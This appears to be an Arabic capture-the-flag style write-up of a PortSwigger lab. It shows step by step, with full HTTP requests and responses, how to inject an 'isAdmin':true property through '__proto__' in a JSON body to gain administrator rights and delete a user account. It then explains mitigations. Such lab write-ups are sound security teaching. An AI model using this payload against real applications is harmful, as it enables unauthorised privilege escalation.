# [Privilege escalation via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution)

## **`الهدف`**
قم بالعثور على مصدر يمكنك استخدامه لإضافة خصائص عشوائية إلى `Object.prototype`، ثم قم بتحديد خاصية من خصائص الأداة `Gadget` التي تسمح لك برفع الصلاحيات، ثم قم بالدخول إلى لوحة التحكم وحذف حساب `Carlos`.
## **`خطوات الحل`**
سنقوم بتسجيل الدخول إلى حساب `wiener:peter` وبعد ذلك سنقوم بتغيير أى جزء من الـ `Billing and Delivery Address` ونضغط `Submit` وبعد ذلك سنقوم بالعثور على الطلب الخاص بهذا الجزء في `HTTP history` ونقوم بتحويله إلى `Repeater`
```http
POST /my-account/change-address HTTP/2
Host: 0aa500f504238f4d8057718d00f4008f.web-security-academy.net
Cookie: session=G3gYiVmUpNaTa0bbCyYlKRAPObABBFIi

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"G3gYiVmUpNaTa0bbCyYlKRAPObABBFIi"}
```

وعند فحص الاستجابة سنجد أن السيرفر يرد بـ `JSON` يمثل المستخدم الخاص بنا.
```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"c0-wwwycOX3bwcfudlvhgc2EcxaN4Y"
Date: Mon, 02 Nov 2026 11:43:22 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 192

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false}
```

بعد ذلك سنقوم بتعديل الطلب عن طريق وضع خاصية جديدة في `JSON` باسم `__proto__`
```http
POST /my-account/change-address HTTP/2
Host: 0aa500f504238f4d8057718d00f4008f.web-security-academy.net
Cookie: session=G3gYiVmUpNaTa0bbCyYlKRAPObABBFIi

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"G3gYiVmUpNaTa0bbCyYlKRAPObABBFIi",
"__proto__": {
    "test1":"test2"
}}
```

وسنجد أن الاستجابة تحتوى على القيمة التى قمنا بإضافتها ولكن لم يتم تضمين خاصية `__proto__` 
```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"d0-zP+JZ4ZXS3rMVbMDGBe9kkDMwek"
Date: Mon, 02 Nov 2026 11:47:35 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 208

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false,"test1":"test2"}
```
وهذا يشير بقوة إلى نجاح تلويث كائن النموذج الأولي وان الخاصية تم توريثها عبر سلسلة النماذج الأولي.

بعد ذلك سنقوم بتعديل الطلب عن طريق وضع خاصية `isAdmin` بقيمة `true` في `JSON` باسم `__proto__` 
```http
POST /my-account/change-address HTTP/2
Host: 0aa500f504238f4d8057718d00f4008f.web-security-academy.net
Cookie: session=G3gYiVmUpNaTa0bbCyYlKRAPObABBFIi

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"G3gYiVmUpNaTa0bbCyYlKRAPObABBFIi",
"__proto__": {
    "isAdmin":true
}}
```

وسنجد أن الاستجابة قد تم تحديث قيمة `isAdmin` بها
```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"cf-DGivqAELnhiLLwJh1xtZ9kjyG9w"
Date: Mon, 02 Nov 2026 11:48:25 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 207

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":true,"test1":"test2"}
```
وبعد ذلك سنقوم بالتوجه إلى المتصفح وندخل إلى لوحة التحكم ثم نقوم بحذف حساب `Carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب التوقف عن دمج المدخلات القادمة من المستخدم عبر طلبات `HTTP` وتحديداً من جسم الطلب `Body` مباشرة في كائنات التطبيق `Objects` دون فلترة، وتمريرها إلى وظائف حساسة تؤدي لترقية الصلاحيات `Privilege Escalation`، واستبدالها بإنشاء كائنات معزولة تماماً لا ترث من النموذج الأولي الأساسي `Object.prototype`. 

ويجب التحقق من ملكية أي خصائص ديناميكية يتم استدعاؤها من كائن المستخدم قبل معالجتها واستخدامها لمنح صلاحيات الإدارة `isAdmin`، ولضمان عدم تجاوز هذا التحقق، يجب تجنب استدعاء دالة `hasOwnProperty` مباشرة من الكائن (لأن المهاجم قد يقوم بتلويث الدالة نفسها)، والاعتماد بدلاً من ذلك على دوال التحقق الجذرية والآمنة مثل `Object.hasOwn()` أو `Object.prototype.hasOwnProperty.call()` لضمان أنها خصائص أصلية وليست قادمة من وراثة خبيثة. 

وإذا كان الهدف هو دمج بيانات المستخدم المدخلة لتحديث العنوان مع الكائن الأساسي `Object Merging`، فيجب على المبرمجين الاعتماد على آليات تعقيم صارمة `Sanitization` تتجاهل وتستبعد أي مفاتيح محجوزة `Special Keys` مثل `__proto__` أو `constructor`، والتي تتعامل مع الهيكل الأساسي للغة وتمنع المهاجم من تلويث النموذج المبدئي `Prototype`. 

ويجب تطبيق تقنية تجميد الكائنات `Object Freezing` على النموذج المبدئي الأساسي للغة في بداية تشغيل التطبيق لمنع أي تعديل عليه، ولكن يجب اختبار هذا الحل جيداً في بيئة العمل قبل تنفيذه لأن بعض المكتبات القديمة قد تعتمد على تعديل الـ `Prototype` مما قد يسبب مشاكل.

وكطبقة حماية إضافية، يجب تطبيق مبدأ القائمة البيضاء `Allowlist` الذي يقيد الخصائص المسموح بتحديثها، فحتى لو فشل المطور في تأمين الكود برمجيًا ونجح المهاجم في حقن خاصية الإدارة الخبيثة، سيتدخل السيرفر ويتجاهلها ويمنع تنفيذها.
